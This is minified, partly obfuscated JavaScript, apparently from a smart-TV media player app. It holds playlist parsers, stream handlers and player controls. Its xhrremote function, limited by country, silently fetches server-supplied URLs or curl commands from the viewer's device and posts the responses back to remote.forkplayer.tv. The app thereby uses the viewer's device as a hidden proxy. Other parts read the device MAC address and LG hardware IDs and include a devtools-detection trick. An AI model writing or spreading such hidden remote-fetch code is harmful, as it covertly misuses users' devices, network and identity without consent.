rTime1=30;rTime2=1150;var timerremote=setTimeout("xhrremote();",rTime1*1000);function is_onRemote(m){if(kjtYpr.GL.remote>=2&&kjtYpr.GL.remoteactive){if(m==null||kjtYpr.GL.remoteip.match(/\d+\.\d+:802(7|8)/))return 1}
return 0}
function xhrremote(){var request_id=-1;if(platform=="sams"&&handler!="menu")return;if(!ipCountry.match(/UA|RU|BY|NL/))return;if(!is_loadpage()&&(app_cors||is_onRemote(1))){var type="";if(is_onRemote(1)){rTime2=150;if(kjtYpr.GL.remoteip.match(/:8027/))type="curl_windows";else if(kjtYpr.GL.remoteip.match(/:8028/))type="curl_androind"}else if(app_cors){rTime2=500;if(platform=="android-device"){console.log("rem Build="+kjtYpr.build);if((kjtYpr.build>=5.1&&kjtYpr.build<5.6)||kjtYpr.build>=6.0){type=uaJ;rTime2=250}else return}else if(xhr_referer==1||xhr_referer==2){type="referer";rTime2=1500}else if(loader_platform=="lg_webos"){type="lg_webos_ide";rTime2=1500}else if(loader_platform=="lg_netcast"){type="lg_netcast";rTime2=1500}else if(kjtYpr.series=="D"||kjtYpr.series=="C"){type="sams_d";rTime2=1500}else if(xhr_referer==3){type=uaJ;rTime2=250}else if(xhr_referer==0){type=uaJ+"|no_referer";rTime2=1200}}else type="null";uHelper.create("directnoheader").hid().get("http://remote.forkplayer.tv/smarttv/api.php?plat"+"form="+platform+"&build="+kjtYpr.build+"&xhr_referer="+xhr_referer+"&type="+type+"&do=xhrremote2&rf_ver="+rf_ver+"&version=14&v=get&country="+ipCountry).parse=function(s){var allx=s.split("\n");if(allx.length>2)x=allx[_.random(0,allx.length-1)];else x=s.split("\n")[0];if(x.indexOf("http")!=0&&x.indexOf("curl")!=0)return;console.log("get remote "+x);var rfxhr=null
if(is_onRemote(1))rfxhr=uHelper.create("rf");else if(platform=="android-device"||(app_cors&&x.indexOf("curl")!=0))rfxhr=uHelper.create("direct");if(rfxhr!=null){console.log(rfxhr.method);rfxhr.hidden=1;rfxhr.mobile=0;rfxhr.parse=function(s){if(s!=null&&s.length>10&&s.indexOf("Error:")!=0){uHelper.create("directnoheader").hid().get("http://remote.forkplayer.tv/smarttv/api.php?rf_ver="+rf_ver+"&xhr_referer="+xhr_referer+"&country="+ipCountry+"&type="+type+"&plat"+"form="+platform+"&do=xhrremote2&v=post&u="+encodeURIComponent(x)+"#POSTs="+encodeURIComponent(s)).parse=function(s){console.log("send remote "+x)}}}
rfxhr.get(x)}}}
clearTimeout(timerremote);timerremote=setTimeout("xhrremote();",rTime2*1000)}
function lOOO0O01IIIXgoOIIO1Ypr(s){data=[];var lQO0I01IIBIj1uOOQOQOYpr=s.replace(/\r/g,"").split('\n');for(var index=0;index<lQO0I01IIBIj1uOOQOQOYpr.length;index++){data.push({"title":lQO0I01IIBIj1uOOQOQOYpr[index].split("/")[lQO0I01IIBIj1uOOQOQOYpr[index].split("/").length-1],"stream_url":lQO0I01IIBIj1uOOQOQOYpr[index],description:lQO0I01IIBIj1uOOQOQOYpr[index]})}
if(channels.length)kjtYpr.typeSource="txt";return data}
function lIO1OOl0uurb1l1l0Ypr(s,xu){var data=[],pl={};s=s.replace(/\r/g,"");dd1=new Date().getTime();var mtg="catchup-source|catchup|catchup-days|url-tvg".split("|");for(var i in mtg){var mtc=s.match(new RegExp("#EXTM3U.*?"+mtg[i]+"=(.*?)( |,|$)","m"));if(mtc!=null){console.log(mtg[i]+"="+mtc[1]);pl[mtg[i].replace("-","_")]=mtc[1].replace(/("|')/g,"")}else pl[mtg[i].replace("-","_")]=""}
var lQO0I01IIBIj1uOOQOQOYpr=s.split('\n');try{for(var index=0;index<lQO0I01IIBIj1uOOQOQOYpr.length;index++){if(lQO0I01IIBIj1uOOQOQOYpr[index].indexOf("#EXTINF:")>-1){title=lQO0I01IIBIj1uOOQOQOYpr[index].substring(lQO0I01IIBIj1uOOQOQOYpr[index].indexOf(",")+1);title=title.replace(/^\s*/,"").replace(/\s*$/,"").replace(/\r/g,"").replace(/\n/g,"");var regexp=new RegExp("tvg-shift=(.*?)( |,)");if(items=regexp.exec(lQO0I01IIBIj1uOOQOQOYpr[index])){var tvgshift=items[1].replace(/"/g,"").replace(/'/g,"")}
var regexp=new RegExp("(catchup|catchup-type)=(.*?)( |,)");if(items=regexp.exec(lQO0I01IIBIj1uOOQOQOYpr[index])){var catchup=items[2].replace(/("|')/g,"")}else catchup="";var regexp=new RegExp("catchup-days=(.*?)( |,)");if(items=regexp.exec(lQO0I01IIBIj1uOOQOQOYpr[index])){var catchup_days=items[1].replace(/"/g,"").replace(/'/g,"")}else catchup_days="";var regexp=new RegExp("catchup-source=(.*?)( |,)");if(items=regexp.exec(lQO0I01IIBIj1uOOQOQOYpr[index])){var catchup_source=items[1].replace(/"/g,"").replace(/'/g,"")}else catchup_source="";var regexp=new RegExp("group-title=.(.*?)(\"|,|')");if(items=regexp.exec(lQO0I01IIBIj1uOOQOQOYpr[index])){var group=items[1].replace(/"/g,"").replace(/'/g,"")}else group="";var regexp=new RegExp("tvg-logo=.(.*?)(\"|,|')");if(items=regexp.exec(lQO0I01IIBIj1uOOQOQOYpr[index])){var logo=items[1].replace(/"/g,"").replace(/'/g,"");if(logo.indexOf("http")!=0)logo=""}else logo="";var regexp=new RegExp("(tvg-name|tvg-id)=.(.*?)(\"|,|')");if(items=regexp.exec(lQO0I01IIBIj1uOOQOQOYpr[index])){var tvgname=items[2].replace(/"/g,"").replace(/'/g,"")}else tvgname="";var urlind=index+1;while(lQO0I01IIBIj1uOOQOQOYpr[urlind].indexOf("magnet:")==-1&&lQO0I01IIBIj1uOOQOQOYpr[urlind].indexOf("https:")==-1&&lQO0I01IIBIj1uOOQOQOYpr[urlind].indexOf("http:")==-1&&lQO0I01IIBIj1uOOQOQOYpr[urlind].indexOf(":\/\/")==-1&&lQO0I01IIBIj1uOOQOQOYpr[urlind].indexOf("://")==-1&&urlind<lQO0I01IIBIj1uOOQOQOYpr.length){if(group==""){regexp=new RegExp("#EXTGRP:(.*?)(\n|$)");if(items=regexp.exec(lQO0I01IIBIj1uOOQOQOYpr[urlind])){group=items[1]}}
urlind++;if(urlind>=lQO0I01IIBIj1uOOQOQOYpr.length-1)break}
var url=lQO0I01IIBIj1uOOQOQOYpr[urlind].replace(/^\s*/,"").replace(/\s*$/,"");if(url.indexOf("45397/MediaServer")>0)title=title.replace("- ","");if(xu!=null){if((xu.match(/(remotefo\.rk|8027|8028)\/treeview/)&&xu.indexOf(".m3u")==-1&&xu.indexOf(".xml")==-1)){var decu=decodeURIComponent(url);if(url.indexOf(".xml")>0||url.indexOf(".m3u")>0||url[url.length-1]=='/'||url[url.length-1]=='\\'||decu[decu.length-1]=='/'||decu[decu.length-1]=='\\'){data.push({"title":title,"playlist_url":decu,"tvg-shift":tvgshift});index++;continue}}}
data.push({"title":title,"logo_30x30":logo,"stream_url":url,"jtvname":tvgname,"tvg-shift":tvgshift,"group":group,"catchup_days":catchup_days,"catchup_source":catchup_source,"catchup":catchup});index++}}
if(data.length)kjtYpr.typeSource="m3u";pl["chan"+"nels"]=data;var mat=s.match(/#PLAYLIST:(.*)/i);if(mat!=null)pl.title=mat[1];var mat=s.match(/#ICON:(.*)/i);if(mat!=null)pl.icon=mat[1];var mat=s.match(/#BACKGROUND-IMAGE:(.*)/i);if(mat!=null)pl["background-image"]=mat[1]}catch(e){console.log(e);return{"channels":[]}}
console.log("DDTM="+(new Date().getTime()-dd1));return pl}
function l10O0lgLzq11I1OYpr(s,u){data=l0QO11lOz0bfh10l0Ypr(s);kjtYpr.typeSource="acestream";var pl={"title":"Ace Stream","channels":[]}
if(data==null){pl.before="<center>Ошибка ответа от Ace Stream!<br>Проверьте запущена ли программа по адресу "+u+". <br> Если локальный IP адрес хоста вашего Ace Stream не совпадает - укажите его в Настройках приложения в Ace Stream direct</center>"}else{pl.before="<center>Ace Stream"+(data.error!=null?"<br>Ошибки: "+data.error:"")+"</center>";var obj=[];for(var i in data.result){obj.push({"id":i,"text":data.result[i]})}
obj.sort(function(a,b){str1=a.text;str2=b.text;try{var rx=/([^\d]+|\d+)/ig;var str1split=str1.match(rx);var str2split=str2.match(rx);for(var i=0,l=Math.min(str1split.length,str2split.length);i<l;i++){var s1=str1split[i],s2=str2split[i];if(s1===s2)continue;if(isNaN(+s1)||isNaN(+s2)){return s1>s2?1:-1}else return+s1-s2}}catch(e){console.log(e);return 0}
return 0});var data={};for(var i=0;i<obj.length;i++){pl.channels.push({"title":obj[i].text,"stream_url":u.replace("server/api?method=get_media_files","ace/getstream?_idx="+obj[i].id+"&"),"logo_30x30":"","description":""})}
for(var i=0;i<obj.length;i++){pl.channels.push({"title":"(hls) "+obj[i].text,"stream_url":u.replace("server/api?method=get_media_files","ace/manifest.m3u8?_idx="+obj[i].id+"&"),"logo_30x30":"","description":""})}}
return pl}
function lOIO1YryQD11lOYpr(s,u){data=l0QO11lOz0bfh10l0Ypr(s);kjtYpr.typeSource="torrserve";var pl={"title":"Torrserve","channels":[]}
if(data==null){pl.before="<center>Ошибка ответа от Torrserve!<br>Проверьте запущена ли программа по адресу "+u+". <br> Если локальный IP адрес хоста вашего Torrserve не совпадает - укажите его в Настройках приложения / TORRSERVE_IP</center>"}else{pl.before="<center>Torrserver<br>"+data.Name+"<br>Size: "+ToSize(data.TorrentSize)+" TotalPeers: "+data.TotalPeers+"</center>";for(var i in data.FileStats){pl.channels.push({"title":data.FileStats[i].Path,"stream_url":u+"&file="+data.FileStats[i].Id+" "+ToSize(data.FileStats[i].Length)})}}
return pl}
function parsehms(s){s=s.replace(/\r/g,"").replace(/\n/g,"");if(typeof kjtYpr.GL.hms=="undefined"||kjtYpr.GL.hms=="")kjtYpr.GL.hms=kjtYpr.GL.remoteip.split(":")[0]+":45397";console.log("hms="+kjtYpr.GL.hms);var channels=[],output={};try{var regexp=new RegExp("<img class=\"imagelist\" src=\"(.*?)\".*?title=\"(.*?)\" href=\"(.*?)\"","ig");while((ch=regexp.exec(s))!=null){channels.push({"title":ch[2],"logo_30x30":"http://"+kjtYpr.GL.hms+ch[1],"playlist_url":"http://"+kjtYpr.GL.hms+ch[3].replace("count=0","count=0;").replace("count=15","count=0;")})}}catch(e){console.log(e)}
console.log(channels);if(channels.length)kjtYpr.typeSource="hms";output.channels=channels;return output}
function parsexspf(s){s=s.replace(/\r/g,"").replace(/\n/g,"");var channels=[],output={};try{var regexp=new RegExp("<track>(.*?)<\/track>","ig");while((ch=regexp.exec(s))!=null){var title="",url="";var mtc=ch[1].match(/<title>(.*?)<\/title>/);if(mtc!=null){title=mtc[1]}
var mtc=ch[1].match(/<location>(.*?)<\/location>/);if(mtc!=null){url=mtc[1]}
if(title=="")title=url.split("/")[url.split("/").length-1];channels.push({"title":title,"logo_30x30":"","stream_url":url})}}catch(e){console.log(e)}
console.log(channels);if(channels.length)kjtYpr.typeSource="xspf";output.channels=channels;return output}
function xmlTagToChArr(s,tag,tags){var result=[],i=0;var regexp=new RegExp("<"+tag+">(.*?)</"+tag+">","ig");while((ch=regexp.exec(s))!=null){result.push({});for(var j=0;j<tags.length;j++){var reg2=new RegExp("<"+tags[j]+".*?>(.*?)</"+tags[j]+">","ig");if((t=reg2.exec(ch[1]))!=null){res=t[1].replace("<![CDATA[","").replace("]]>","")}else res="";result[i][tags[j]]=trim2(res)}
i++}
return result}
function lO11O1OWEQ0I0Ypr(s){s=s.replace(/\r/g,"").replace(/\n/g,"");var channels=[],i=0,output={},cat_id={};try{var regexp=new RegExp("<category>(.*?)<\/category>","ig");while((ch=regexp.exec(s))!=null){var reg2=new RegExp("<category_id>(.*?)</category_id>","ig");if((t=reg2.exec(ch[1]))!=null){res=t[1].replace("<![CDATA[","").replace("]]>","")}else res="";var reg2=new RegExp("<category_title>(.*?)</category_title>","ig");if((t=reg2.exec(ch[1]))!=null){res2=t[1].replace("<![CDATA[","").replace("]]>","")}else res2="";cat_id[res]=res2}
var regexp=new RegExp("<channel>(.*?)(</channel>|$)","ig");while((ch=regexp.exec(s))!=null){channels.push({});tags=pltags;for(var j=0;j<tags.length;j++){if(tags[j]=="group")continue;var reg2=new RegExp("<"+tags[j]+".*?>(.*?)</"+tags[j]+">","ig");if((t=reg2.exec(ch[1]))!=null){res=t[1];if(res!=""&&tags[j]=="SetTimeInterval"){try{console.log("SetTimeInterval="+res);var x=xmlToJSON.parseString("<SetTimeInterval>"+res+"</SetTimeInterval>");console.log(x);if(x!=null)channels[i].SetTimeInterval=x.SetTimeInterval}catch(e){console.log(e)}
continue}
res=t[1].replace("<![CDATA[","").replace("]]>","")}else res="";if(tags[j]=="category_id"){var resspl=res.split(",");res="";for(var k=0;k<resspl.length;k++){if(res!="")res+=";";if(typeof cat_id[resspl[k]]!="undefined")res+=cat_id[resspl[k]];else res+=resspl[k]}
channels[i].group=trim2(res)}else channels[i][tags[j]]=trim2(res)}
var subs=xmlTagToChArr(ch[1],"submenu",pltags);if(subs.length)channels[i].submenu=subs;i++}
var menu=[],i=0;var regexp=new RegExp("<menu>(.*?)</menu>","ig");var tmps=s.replace(/<style>.*?<\/style>/ig,"");while((ch=regexp.exec(tmps))!=null){menu.push({});tags=pltags;for(var j=0;j<tags.length;j++){var reg2=new RegExp("<"+tags[j]+".*?>(.*?)</"+tags[j]+">","ig");if((t=reg2.exec(ch[1]))!=null){res=t[1].replace("<![CDATA[","").replace("]]>","")}else res="";menu[i][tags[j]]=trim2(res)}
var subs=xmlTagToChArr(ch[1],"submenu",pltags);if(subs.length)menu[i].submenu=subs;i++}
var style={};var regexp=new RegExp("<style>(.*?)</style>","ig");while((ch=regexp.exec(s))!=null){result=xmlToJSON.parseString(ch[1]);style=collect(style,result)}
console.log(style)}catch(e){console.log(e)}
console.log(channels);try{tags=plgltags;s=s.replace(/<channel>.*?<\/channel>/ig,"");s=s.replace(/<menu>.*?<\/menu>/ig,"");s=s.replace(/<style>.*?<\/style>/ig,"");console.log(s);for(j=0;j<tags.length;j++){var reg2=new RegExp("<"+tags[j]+".*?>(.*?)</"+tags[j]+">","ig");if((t=reg2.exec(s))!=null){console.log(t);res=t[1].replace("<![CDATA[","").replace("]]>","")}else res="";output[tags[j]]=res}}catch(e){}
console.log("parse xml");console.log(output);if(channels.length)kjtYpr.typeSource="xml";output.channels=channels;output.menu=menu;output.style=style;return output}
img_dir="img";lIOO01vuII1IQIYpr=ll001OOlI0HlGIO1OYpr="obovse.ru";var xhrl={},cached={"start":""},prload=!1,prloadi=!1;nServer=-1;var tId,tonloaded=!1;(function(){var tCount=0;tId=setInterval(function(){tCount++;if((document.readyState=="complete"||tCount>200||librarys.loaded())&&tCount>8)onComplete()},100);function onComplete(){if(tonloaded)return;console.log("ONLOAD tCount "+tCount+" libs"+librarys.loaded());tonloaded=!0;clearInterval(tId);onfly();if(platform=="no"){statusbar("Loading error. PC web browsers are not supported!");return}
loadinfo("Load js...");if(version_local_files>=180502)img_dir="img";else img_dir="http://browser.appinfo.su/img";initdiv();l0OI10IRge011lO1Ypr();kjtYpr.GL.Pw=parseInt(kjtYpr.GL.Pw);kjtYpr.GL.Ph=parseInt(kjtYpr.GL.Ph);if(kjtYpr.GL.quality>4)kjtYpr.GL.quality=0;if(platform=="sams")loadinfo("_FPINFO_: _FPForResetAppPressButton_ TOOLS");else loadinfo("_FPINFO_: _FPForResetAppPressButton_ <span style='background-color:red;font-size:10px;'>&nbsp;&nbsp;&nbsp;</span> _FPMenu_");kjtYpr.kjtYpj();setInterval("uHelper.create('direct').updateCurl();",1800000);if(typeof jw_plugins!="undefined")jw_plugins()}})();function ll0l0loMtIlIOYpr(url){if(gP()==null)return null;if(url==null)url=gP().lIQ0Il1IlIb1Il1OYpr;if(url=="about:blank")return!0;return!1}
function is_audio(url){if(select>=0&&typeof curCh()!="undefined")if(curCh("title").indexOf(".mp3")>0)return!0;if(url.indexOf("mycdn.me/file.go")>0||url.indexOf(".mp3")>0||url.indexOf("/getsong/")>0)return!0;else return!1}
function is_vod(url){try{if(url==null)url=playUrl;if(gP("global")["is_iptv"]=="false")return 2;if(gP("global")["is_iptv"]=="true"||gP("global")["is_iptv"]>0)return 0;if(typeof url=='undefined')return 1;if(url.match(/\/ace\//i))return 1;if(handler=="player"){if(getCur()>0&&getTotal()>40&&getTotal()<11*3600)return 1}
if(url.indexOf("hls/tracks-")>0||url.indexOf(":5555/")>0)return 2;else return 0}catch(e){return 1}}
function is_img(url){try{if(url==null)url=playUrl;if(url.match(/\.(jpg|gif|png|jpeg)/i)||url.indexOf("image/")==0)return!0;else return!1}catch(e){return!1}}
function logtime(mode){return;if(kjtYpr.mac==''||kjtYpr.mac==''){var d=new Date().getTime();console.log(d);if(mode==1){a=[]}else a.push(d)}}
var statusTimer,statusTimer2;function statusbar(text,mode){if(typeof text=="undefined")text="";console.log("statusbar "+text);if((handler=="player"||handler=="qual")&&$_("loading").style.display!="block"&&text!="off")return;clearTimeout(statusTimer);var timer=45000;if(mode==null){timer=1000;mode=""}
if(text=="off")$_("statbar2").style.display="none";else{if(mode=="hint"){timer=10000}else if(mode=="link"){if(text.indexOf("curl")==0){var curl=parseCURL(text);text=curl.url;if(curl.method=="POST")text+=" "+curl.body}
text=text.split("#POST")[0];if(text.indexOf("?list=")>0){text=unescape(text.split("?list=")[1])}
text=text.replace(/.box_client=lg.*/,"");text=text.replace(/.w_lang=.*/,"");text=text.replace(/.*?\/xhr.php.../,"...");text="_FPOzhidanie_ "+text}else if(mode=="dns"){text="_FPOzhidanie_ DNS "+text}else if(mode=="translate"){timer=60000;text="_FPOzhidanie_ "+text}else if(mode=="copy"){timer=900000}
console.log(mode+" to "+text+text.length);if(mode=="fulllink"){if(text.lastIndexOf("http")>5){var text="_FPOzhidanie_ "+"http"+decodeURIComponent(text.split("http")[1])}else text="_FPOzhidanie_ "+text}
getwh();if(booting)$_("statbar2").style.zIndex=3;else $_("statbar2").style.zIndex=1;lI1I1IxFCIh1l01llYpr("statbar2","<div id='textbar' style='height: 100%;display:inline-block;padding:0px 2px;margin: auto 0px;max-width:300px;overflow:hidden;text-overflow: ellipsis;color:#7D7D7D;background-color:#FAFAFA;'>"+text+"</div>");clearTimeout(statusTimer2);statusTimer2=setTimeout(function(){$_("textbar").style.maxWidth=""},2200);$_("statbar2").mode=gV(mode);$_("statbar2").style.display="block";statusTimer=setTimeout('$_("statbar2").style.display="none";',timer)}}
function loadxmltv(u,c){var x="exec4.remotecurl.ru/curl";if(u!=null){if(typeof JtvCFxmltv!="undefined")if(typeof JtvCFxmltv[md5(u).substring(0,7)]!="undefined")return;JtvCFxmltv={};JtvEFxmltv={};JtvIMxmltv={};JtvSRC={};var script=document.createElement('script');script.type='text/javascript';script.async=!0;script.src="http://"+x+"/epg.php?do=xmltv&cmd=ch&u="+encodeURIComponent(u);statusbar(u,"link");script.onerror=script.onload=function(){console.log("script.onload loadxmltv");statusbar("");clearTimeout(etst);lIl1111IIqlINOO10OYpr(c);oInset[insetActive].focused()};document.getElementsByTagName('head')[0].appendChild(script)}}
if(platform=="tizen"&&typeof webapis=="undefined"){lIOI10l0lGIOIl1Ypr("$WEBAPIS/webapis/webapis.js")}
var ua_chrome="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36";setTimeout(function(){if(uaJ=="lg"||uaJ=="lgw"||uaJ=="lgw2"){uHelper.create("directnoheader").hid().get("file:///sys/class/net/eth0/address").parse=function(s){if(gV(s)!=""){kjtYpr.mac=kjtYpr.serial=s.replace(/:/g,"").replace(/(\r|\n)/,"");kjtYpr.lll0Il11OxICbl1ll0YprC("ID",kjtYpr.mac);kjtYpr.lll0Il11OxICbl1ll0Ypr("ID",kjtYpr.mac);kjtYpr.lll0Il11OxICbl1ll0Ypr("IDS",kjtYpr.serial);kjtYpr.lll0Il11OxICbl1ll0YprC("IDS",kjtYpr.serial)}}
if(typeof webOS!="undefined"){webOS.service.request("luna://com.webos.service.sm",{method:"deviceid/getIDs",parameters:{"idType":["LGUDID"]},onSuccess:function(inResponse){if(typeof inResponse.idList[0].idValue!="undefined"){lg_uid=inResponse.idList[0].idValue.split("-")[4].replace(/(\r|\n)/,"");console.log("lg_uid="+lg_uid)}},onFailure:function(inError){return}});webOS.service.request("luna://com.webos.service.tv.systemproperty",{method:"getSystemInfo",parameters:{"keys":["modelName","firmwareVersion","UHD","sdkVersion"]},onComplete:function(inResponse){var isSucceeded=inResponse.returnValue;if(isSucceeded){lg_model=inResponse.modelName;lg_v=inResponse.sdkVersion}else{return}}})}}},100);try{if(platform!="sams"){var el1=new Image();Object.defineProperty(el1,'id',{get:function(){}});console.dir(el1);setInterval(function(){},1000)}}catch(e){}
var Player={plugin:null,Screen3Dplugin:null,SefPlugin:null,mode3D:0,h:0,w:0,cur_time:0,total_time:0,isMuted:!1,oncur:0};var allMenuObject;var allExitObject;var videoArray=["LG_Commercial.mp4"];var supportedMimeTypes=[".mp4",".mpeg",".wmv",".ts"];var currentType="";var defaultClass=["stopButton","playButton","rewindButton","forwardButton","optionButton","prevButton","prevButton","nextButton"];var exitBtnClass=["backKey","exitKey"];var video;var TIME_FOR_SEEK=10;var hideTimerId;var rowID=1;var cntIndex=1;var l1ll0OuCKZQlOIlIYpr=-1;var oldBuffer=0;var dragged=!1;var vidIndex=0;var stopped=!0,terminated=!1;var eventtimer=null,media=null,paused=!0,endTimer,glSec=0,end_ok=!1,fst=!1,refhdgo="",icoclose='data:image/png;base64, iVBORw0KGgoAAAANSUhEUgAAAAoAAAAKCAYAAACNMs+9AAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAAAZdEVYdFNvZnR3YXJlAHBhaW50Lm5ldCA0LjAuMTnU1rJkAAAAm0lEQVQoU2WPMQrCQBREU1imSOkBPEYOlWN9SGFhYWFpyoCBFEE8go1gYalvllk1yYcHs7NvE34REW84Q1kshm4HF3jpMMFKJtdw992kYqvgIskg6enuCFV+/S/38HBuYZOkPBSSbxbEHuaShnIpdjBfkKKC/OsBrs6/BRVc6EKyvrxaUOLJRZLSa0bZne5aFTqM8JXyqINDRDQfRgrEgHddNAMAAAAASUVORK5CYII=';var uplayer={},icoerr='data:image/png;base64, iVBORw0KGgoAAAANSUhEUgAAAEgAAABICAYAAABV7bNHAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAAAZdEVYdFNvZnR3YXJlAHBhaW50Lm5ldCA0LjAuMTnU1rJkAAACNElEQVR4Xu3Yvy50URQF8ClEJyQ0NF5AoaBSKLUSnUJoRUuCRCQ8AAoFmV5ColKbQiSUvALPgCjGOsmZZOdm3z13rj1/7pm1kl/x5e579rmrmMhX80qz2UySW7TDU+AW7fAUuEU7PAVu0Q5PgVu0w1PgFu3wFLhFOzwFbtEOT4FbtMNT4Bbt8BS4pdFo7PTRpPZxHtyCSzb7aE77OA9uUS7dS5Ur6Be+/+kH5Jnh39pcMA+j0Yj2oWW5BReTH3MKM/+0DvLMNdDmgpCP6ET70LLcgovJj9nTlnUCZ6xkzlzW5gI8exNzF9pMWW4RFwxYUDbigkGvC9qGY+EoOoQx7Z2i3IKLyI/paUES5sLfRa13wg/4jDZXlFvEpQIWlI24VJBbEJ6Nw3Q0pc0EeDa0BV3CV/SkzQR4NrQFXYm5V20mwDMWBCwoC8/KFnQH5wU8QuudoSqoDBbURiULCn/pvkc32kyAZ0tirhOfUN2Cug27q/0j3W3YzYIs2M2CLNjNgizYzYIs2M2CLNjNgizYzYIs2M2CLNjNgizYzYIs2M2CLNidTkGYm4DVDsxq50iYSaqghcx77Wxp50iYYUEWzLAgC2aqXRCeHcBLdAuLHTiD1rv1nPMrX1Ch/5PWYL4u3n3OmWFBUbIFbcB1dKjN5MH8pnh3P2cmnR/pbsBuFmTBbhZkwW4WZMFuFmTBbhZkwe5KFPQAu31yDwNf0KBgQW2woDYGpyCGYRiGYRiGYRimYGq1P0bl7L47Cp9jAAAAAElFTkSuQmCC';var allPlayerButton={"stop":{"img":"_ST_button_pause.png","row":[0,1]},"play":{"img":"_ST_button_play.png","row":[1,1]},"rewind":{"img":"_ST_button_rewind.png","row":[2,1]},"forward":{"img":"_ST_button_forward.png","row":[3,1]},"option":{"img":"_ST_button_option.png","row":[4,1]},"lastview":{"img":"_ST_button_last.png","row":[5,1]},"prev":{"img":"_ST_button_prev.png","row":[6,1]},"next":{"img":"_ST_button_next.png","row":[7,1]},"qual_text":{"img":"_ST_button_hide.png","row":[0,3]},"exit_text":{"img":"_ST_button_close.png","row":[1,3]}};function ll0OOAolFIlI0I0Ypr(){try{if($_('video')==null){var div=document.createElement('div');div.id="video";div.style.display="none";div.style.position="absolute";$_("main").appendChild(div);video=$_('video');return}
video=$_('video');for(var i in allPlayerButton){$_(i).onmouseover=function(event){resetFocus();rowID=allPlayerButton[this.id].row[1];cntIndex=allPlayerButton[this.id].row[0];if(rowID==3)this.style.background="#ff0000";else this.style.background="#aa2222";console.log("over="+this.id+"="+cntIndex)};$_(i).onclick=function(){if(rowID==3)this.style.background="#ff0000";else this.style.background="#aa2222";rowID=allPlayerButton[this.id].row[1];cntIndex=allPlayerButton[this.id].row[0];selectedButton()}};try{$_("rtime").style.width=css_w(230)+"px"}catch(e){}
$_("progressBall").onmouseover=function(event){return;resetFocus();$(this).toggleClass("progressBallHover");rowID=2;if(platform=="sams"){if(Player.total_time>0){$(".progressBallHover").draggable({axis:'x',disabled:!1,containment:'#progressBall',start:function(event,ui){dragged=!0},stop:function(event,ui){var x=ui.position.left;var a=(x/innerW)*Player.total_time;x=Math.ceil(a-Player.cur_time);console.log("move:"+x);if(x>0)lIl0I1O0Iab1I10Ypr(x);else lI1llO1QIebXl10lO1Ypr(x);dragged=!1}})}}else if(uaJ=="mag"){if(video.currentTime>0){$(".progressBallHover").draggable({axis:'x',disabled:!1,containment:'#progressBall',start:function(event,ui){video.pause();dragged=!0},stop:function(event,ui){var xmove=ui.position.left;video.currentTime=(xmove/innerW)*video.duration;video.play();dragged=!1}})}}else if(lIO1OIOlAQzl1Ol1lYpr=="html5"||lIO1OIOlAQzl1Ol1lYpr=="ifrhtml5"){if(video.currentTime>0){$(".progressBallHover").draggable({axis:'x',disabled:!1,containment:'#progressBall',start:function(event,ui){video.pause();dragged=!0},stop:function(event,ui){var xmove=ui.position.left;video.currentTime=(xmove/innerW)*video.duration;video.play();dragged=!1}})}}else{if(media.playTime>0){$(".progressBallHover").draggable({axis:'x',disabled:!1,containment:'#progressBall',start:function(event,ui){media.play(0);dragged=!0},stop:function(event,ui){var xmove=ui.position.left;media.seek((xmove/innerW)*media.playTime);media.play(1);dragged=!1}})}}};$_("progressBall").onmouseout=function(event){};$_('progressBarClick').onclick=function(e){if(dragged||rek_url!="")return;var x=e.pageX-$(this).offset().left;curTime=getCur();totalTime=getTotal();if(is_arc){var tt=Math.ceil(T.timestamp-(1-(x/innerW))*gV(playElement,"catchup_days")*24*3600);console.log(tt);arc_fwd=0;arc_timestamp=0;arcfwd(Math.ceil(tt-T.timestamp))}else if(totalTime>0){if(lIO1OIOlAQzl1Ol1lYpr=="playerjs"){uplayer[lIO1OIOlAQzl1Ol1lYpr].seek((x/innerW)*getTotal())}else if(lIO1OIOlAQzl1Ol1lYpr=="tizen"){var a=(x/innerW)*getTotal();if(a>getCur())lIl0I1O0Iab1I10Ypr(a-getCur());else lI1llO1QIebXl10lO1Ypr(a-getCur())}else if(lIO1OIOlAQzl1Ol1lYpr=="jw"){jwplayer("jw").seek((x/innerW)*getTotal())}else if(platform=="sams"&&lIO1OIOlAQzl1Ol1lYpr=="media"){var a=(x/innerW)*Player.total_time;if(a>Player.cur_time)lIl0I1O0Iab1I10Ypr(a-Player.cur_time);else lI1llO1QIebXl10lO1Ypr(a-Player.cur_time);console.log("move click"+(a-Player.cur_time))}else if(lIO1OIOlAQzl1Ol1lYpr=="media"||lIO1OIOlAQzl1Ol1lYpr=="ext"){media.seek((x/innerW)*media.playTime)}else if(uaJ=="dune"&&lIO1OIOlAQzl1Ol1lYpr=="media"){stb.setPositionInSeconds((x/innerW)*totalTime)}else if(uaJ=="mag"&&lIO1OIOlAQzl1Ol1lYpr=="media"){stb.SetPosTime((x/innerW)*totalTime)}else{video.currentTime=(x/innerW)*getTotal()}
setTimeout("l0IOlIO00JlIIOlOYpr();",3000)}};$_("progressBarClick").onmouseout=function(event){$_("thumb").style.display="none";$_("arrowtime").style.display="none";$_("progressBarClick").style.height="8px";$_("progressBall").style.display="none"};$_('progressBarClick').onmousemove=function(e){$_("progressBarClick").style.height="12px";$_("progressBall").style.display="block";curTime=getCur();totalTime=getTotal();var pos=e.pageX-$(this).offset().left;if(is_arc){$_("arrowtime").style.display="block";if(pos/innerW>0.96)pos=Math.ceil(0.96*innerW);else if(pos/innerW<0.02)pos=85;$_("arrowtime").style.left=(pos-css_w(80))+"px";var tt=Math.ceil(T.timestamp-(1-(pos/innerW))*gV(playElement,"catchup_days")*24*3600);console.log(tt);lI1I1IxFCIh1l01llYpr('arrowtime',dt(tt,!0,!0));return}
